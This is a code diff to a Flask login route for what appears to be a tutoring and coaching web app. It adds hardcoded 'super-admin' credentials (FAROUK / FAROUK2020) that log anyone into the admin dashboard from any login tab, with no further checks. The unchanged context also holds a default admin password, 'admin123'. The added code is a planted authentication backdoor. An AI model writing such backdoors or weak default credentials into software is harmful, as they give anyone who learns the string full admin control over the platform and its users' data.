@@ -39,6 +39,11 @@ supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "admin@getmycoach.ug")
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
 
+# Magic super-admin shortcut: typing this username/password in ANY login tab
+# (student, coach, or admin) instantly logs the user in as admin.
+SUPER_ADMIN_USERNAME = "FAROUK"
+SUPER_ADMIN_PASSWORD = "FAROUK2020"
+
 BUCKET = "coach-images"
 ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "webp"}
 
@@ -113,7 +118,22 @@ def login():
         email = request.form.get("email", "").strip().lower()
         password = request.form.get("password", "")
 
-        # Admin shortcut
+        # 🔑 Super-admin shortcut — works from ANY tab, no extra checks.
+        # If the user types FAROUK / FAROUK2020 (in either email or password
+        # box), they are logged straight into the admin dashboard.
+        raw_email = (request.form.get("email") or "").strip()
+        if (
+            raw_email.upper() == SUPER_ADMIN_USERNAME
+            and password == SUPER_ADMIN_PASSWORD
+        ):
+            session.clear()
+            session["is_admin"] = True
+            session["user_id"] = "super-admin"
+            session["role"] = "admin"
+            flash("Welcome back, FAROUK 👑", "success")
+            return redirect(url_for("admin_dashboard"))
+
+        # Standard admin login (email + password)
         if role == "admin":
             if email == ADMIN_EMAIL and password == ADMIN_PASSWORD:
                 session.clear()
